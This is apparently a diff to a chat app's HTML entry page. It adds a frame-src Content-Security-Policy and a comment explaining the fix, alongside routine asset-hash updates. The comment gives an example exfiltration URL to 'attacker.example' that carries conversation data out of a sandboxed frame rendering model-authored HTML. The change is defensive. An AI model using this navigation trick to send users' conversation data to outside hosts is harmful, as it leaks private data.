@@ -10,6 +10,39 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
   <meta name="theme-color" content="#1A2230" media="(prefers-color-scheme: dark)" />
   <meta name="theme-color" content="#EAEDF2" media="(prefers-color-scheme: light)" />
+
+  <!--
+    frame-src, and only frame-src (ATL-1197). Surfaces that render
+    model-authored HTML (dynamic pages, the app viewer, app-card previews) do
+    so in a srcdoc frame sandboxed without `allow-same-origin`. What no CSP
+    inside such a frame can express is the frame navigating its own browsing
+    context: `default-src` governs subresources, and `navigate-to` was never
+    shipped. A document is therefore free to send itself to
+    `https://attacker.example/?d=<conversation data>`, which is egress out of
+    a document that is supposed to have none.
+
+    The embedding page is the only place that navigation can be refused, and
+    `frame-src` is enforced on every navigation of a nested browsing context,
+    not just its first load. srcdoc frames resolve as 'self', so the surfaces
+    keep working. The web SPA shipped no CSP at all, and iOS loads this same
+    deployed bundle, so both were open; the Electron shell already carries an
+    equivalent header policy (apps/macos/src/main/csp.ts) and this meta must
+    stay in step with its frame-src list.
+
+    The ventureverse entries mirror the Electron policy: the parent-org app
+    store is the one allowed external frame if the web inline embed ships
+    (today's VV embed uses a native top-level view, not an iframe).
+
+    This is deliberately a single directive rather than a whole policy. A full
+    CSP for the SPA is worth having, but it is a much larger change with real
+    breakage surface (Google Fonts, Sentry, gateway websockets) and belongs in
+    its own rollout behind report-only. Widening this list is the only reason
+    to touch it: any other directive added here starts blocking things this
+    comment makes no claim about.
+  -->
+  <meta http-equiv="Content-Security-Policy"
+        content="frame-src 'self' https://www.ventureverse.com https://*.ventureverse.com" />
+
   <link rel="icon" href="/assistant/favicon.svg" />
   <link rel="apple-touch-icon" href="/assistant/favicon.svg" />
   <!-- Cue brand type: DM Sans (UI) + DM Mono (eyebrows/timestamps/pills). The
@@ -20,7 +53,7 @@
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300..700&family=DM+Mono:wght@400;500&display=swap" />
   <title>Cue</title>
   <script src="/assistant/theme-init.js"></script>
-  <script type="module" crossorigin src="/assistant/assets/index-Cky8GBOm.js"></script>
+  <script type="module" crossorigin src="/assistant/assets/index-Dro9agU5.js"></script>
   <link rel="modulepreload" crossorigin href="/assistant/assets/rolldown-runtime-BM3Ffeng.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/design-library-PLdIta_8.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/react-vendor-ClZQnK6j.js">
@@ -36,9 +69,9 @@
   <link rel="modulepreload" crossorigin href="/assistant/assets/client.gen-V586IsbI.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/sdk.gen-Ct0gsAHT.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/client.gen-B4k4kY69.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/sdk.gen-CZJRagYn.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/sdk.gen-C2DX3W0U.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/api-errors-cKhP8hQl.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/api-99AgQ2rD.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/api-YWXXFIXO.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/createLucideIcon-CnXevl7S.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/check-DyEaNDbI.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/loader-circle-yAa2OVRI.js">
@@ -49,7 +82,7 @@
   <link rel="modulepreload" crossorigin href="/assistant/assets/native-dictation-partials-rq4K2dVc.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/vellum-commands-4gRsc6wf.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/voice-input-device-BP-Wel3J.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/voice-input-button-DFjCs_gb.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/voice-input-button-B85yKxHk.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/search-34Ot7KXM.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/sparkles-BYkpd6Ti.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/triangle-alert-wnlKCTSX.js">
@@ -58,30 +91,30 @@
   <link rel="modulepreload" crossorigin href="/assistant/assets/assistant-identity-store-wTt7Vl9M.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/semver-BhZmZf5-.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/utils--_xazEHr.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/avatar-api-BG8_JwBZ.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/avatar-api-CGEI5l1w.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/event-bus-EOP_aU7a.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/capture-error-CbO1NtTY.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/auth-store-mDDWFLDy.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/auth-store-BfSzwCf4.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/queryOptions-C_ypb2wA.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/react-query.gen-BhmwnNwY.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/use-needs-you-badge-073PvIqC.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/react-query.gen-D1SmjCuR.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/use-needs-you-badge-CGtaqPnU.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/theme-BHRoWLJu.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/create-intent-BGjCker4.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/create-intent-DbqXD5zK.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/chevron-right-DeYcSkmC.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/ai-types-BDwRN2GD.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/profile-pickers-bBQTQpYs.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/use-is-org-ready-CZf8EG5V.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/profile-editor-modal-CPscVOYJ.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/use-is-org-ready-D-mUsuQF.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/profile-editor-modal-DzvjFjTM.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/theme-preferences-E5eRTXH6.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/use-bus-subscription-QYhuFeDc.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/use-is-mobile-BgQoMlVZ.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/flag-query-freshness-BkV6fE3G.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/feature-flag-catalog-3qNi5C3x.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/hq-theme-D9l-IefL.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/prefs-CwatVZ2a.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/prefs-Cxn4pQjM.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/intro-state-CKyfIaHn.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/build-state-lxcywgmC.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/query-tags-1OhL6JTd.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/build-state-CyYWWH1F.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/query-tags-CjiGZhYj.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/entrance-guard-BxjYroTk.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/glass-card-BOt5XNYS.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/corner-chrome-B9eSOSxU.js">
@@ -94,14 +127,14 @@
   <link rel="modulepreload" crossorigin href="/assistant/assets/users-CksqBxvz.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/video-C5j4o-1M.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/create-form-templates-C2pDgmpq.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/create-remix-Cwz-uDJB.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/create-remix-BQ_vMWSK.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/mv3-kit-xS8aOIe6.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/conversation-store-CgZ4jDd5.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/app-html-cache-CY2z5Lhj.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/viewer-store-Bb9w6eGQ.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/app-html-cache-CC1hCFqG.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/viewer-store-BMKyAkd2.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/haptics-C0HhgTeD.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/pointer-cilaz4Xh.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/create-CN_1GgHB.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/create-DocH3tcX.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/cue-ring-COS5D5Ze.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/sheet-shell-BZy2fagb.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/use-next-move-B8wR64W9.js">
@@ -109,13 +142,13 @@
   <link rel="modulepreload" crossorigin href="/assistant/assets/assistant-feature-flag-store-BFAk5D7Z.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/client-feature-flag-store-BpApjeVp.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/effective-timezone-BJ8-HlKH.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/conversation-cache-DkYreZxE.js">
-  <link rel="modulepreload" crossorigin href="/assistant/assets/conversation-list-fetchers-C4CKIIRW.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/conversation-cache-6hhcPjg2.js">
+  <link rel="modulepreload" crossorigin href="/assistant/assets/conversation-list-fetchers-CE4W3jp9.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/public-asset-DmaFlPWD.js">
   <link rel="modulepreload" crossorigin href="/assistant/assets/rate-limit-retry-BUt1D5a8.js">
   <link rel="stylesheet" crossorigin href="/assistant/assets/design-library-CfUWwwYf.css">
   <link rel="stylesheet" crossorigin href="/assistant/assets/create-BPPcblNj.css">
-  <link rel="stylesheet" crossorigin href="/assistant/assets/index-Kjsorz84.css">
+  <link rel="stylesheet" crossorigin href="/assistant/assets/index-c7hj3mDp.css">
 </head>
 <body>
   <div id="root"></div>
